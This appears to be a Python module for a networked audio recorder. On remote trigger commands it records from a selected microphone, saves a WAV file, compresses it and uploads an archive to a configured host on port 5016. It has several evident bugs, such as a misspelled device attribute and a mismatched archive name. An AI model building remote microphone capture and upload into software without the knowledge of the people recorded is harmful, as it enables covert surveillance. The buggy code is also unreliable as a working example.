from datetime import datetime
from compresse import compressed
import time
import functools
from pyaudio import PyAudio
from data import MyData, Event, Trigger
from network.connection import client

list_thread_id: dict[str, Event] = {}

def timer(func):
    @functools.wraps(func)
    def wrapper_timer(stream, data:MyData, evn:Event, ser):
        value = func(stream, data, evn, ser)
        data.total_time = None
        return value
    return wrapper_timer

def controller(data: MyData, sett: Trigger, ser) -> None:
    data.filename = time.perf_counter()

    match sett.trigger_mode:
        case "start":
            __start_listen(data, sett, ser)
        case "end":
            list_thread_id[str(sett.request)].is_set=False
        case "get":
            _pkl_dump_device(data)
        case _:
            raise RuntimeError("unknown modification Mode[listen_mode]")

    data.is_valid_data = True


def _pkl_dump_device(data: MyData)-> None:
    path = f"device_list_{data.filename}.txt"
    data.py_audio = PyAudio()
    with open(path, 'w') as f:
        temp = PyAudio()
        for _ in range(temp.get_device_count()):
            f.write(str(temp.get_device_info_by_index(_)["name"]))


def __start_listen(data: MyData, sett: Trigger, ser)->None:
    data.py_audio = PyAudio()
    data.frames = []
    req_id:str = sett.request
    stream = data.py_audio.open(format=data.format, channels=data.channels,
                                    rate=data.rate, input=data.input,
                                    input_device_index=sett.evice_id,
                                    frames_per_buffer=data.chunk,)
    print("* start recording")
    evn = Event()
    list_thread_id[f"{req_id}"] = evn
    print(f"start thread {req_id}")
    __listen(stream, data, evn, ser)
    print("* done recording")
    __end_listen(data)
    stream.stop_stream()
    stream.close()
    
def __end_listen(data) -> None:
    time.sleep(0.1)
    cr_wav(data)
    compressed(file_for_compresse=get_last_path_pkl(data))
    send_file("arhive.zip", data)

@timer
def __listen(stream, data: MyData, evn: Event, ser) -> None:
    data.time_start_listen = datetime.now()
    for _ in range(1500):
        if(evn.is_set):
            data.frames.append(stream.read(data.chunk, exception_on_overflow = False))
        else:
            data.time_end_listen = datetime.now()
            break
    
import wave

def cr_wav(data):
    with wave.open(f"{data.path}/{datetime.now().month}m:{datetime.now().day}d_{data.filename}.wav", 'wb') as wf:
        wf.setnchannels(data.channels)
        wf.setsampwidth(data.py_audio.get_sample_size(data.format))
        wf.setframerate(data.rate)
        wf.writeframes(b''.join(data.frames))

cl = client()
def send_file(path: str, data: MyData) -> None:
    cl.send_byte_line(path=path, host=data.ADDR[0], port="5016")
    print("voice was send")

def get_last_path_pkl(data: MyData) -> str:
    return f"{data.path}/{datetime.now().month}m:{datetime.now().day}d_{data.filename}.wav"

"""
def __pkl_dump_data(data: MyData) -> None:
        if not data.is_valid_data:
            raise RuntimeError("data not processed (first you need to pass the data through: get_dates_for_dump(data:MyData))")
        else:
            with open(f"{data.path}/{datetime.now().month}m:{datetime.now().day}d_{data.filename}.pkl", 'wb') as outfile:
                pickle.dump(data, outfile)
            print(f"pkl file ({data.path}/{datetime.now().month}m:{datetime.now().day}d_{data.filename}.pkl) was created")
"""
